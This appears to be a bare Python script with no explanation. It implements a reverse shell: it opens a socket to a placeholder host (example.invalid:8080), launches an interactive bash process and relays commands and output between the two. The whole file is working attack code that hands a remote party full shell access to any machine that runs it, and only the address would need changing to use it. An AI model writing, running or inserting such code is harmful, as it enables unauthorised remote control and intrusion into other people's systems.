import os
import select
import socket
import subprocess


def bridge(peer, child):
    while True:
        ready, _, _ = select.select([peer, child.stdout], [], [], 60)
        for source in ready:
            try:
                buffer = source.recv(4096) if source is peer else os.read(source.fileno(), 4096)
            except Exception:
                buffer = b""
            if not buffer:
                return
            try:
                if source is peer:
                    child.stdin.write(buffer)
                    child.stdin.flush()
                else:
                    peer.sendall(buffer)
            except Exception:
                return


def session():
    peer = socket.create_connection(("example.invalid", 8080))
    child = subprocess.Popen(["/bin/bash", "-i"], stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    bridge(peer, child)
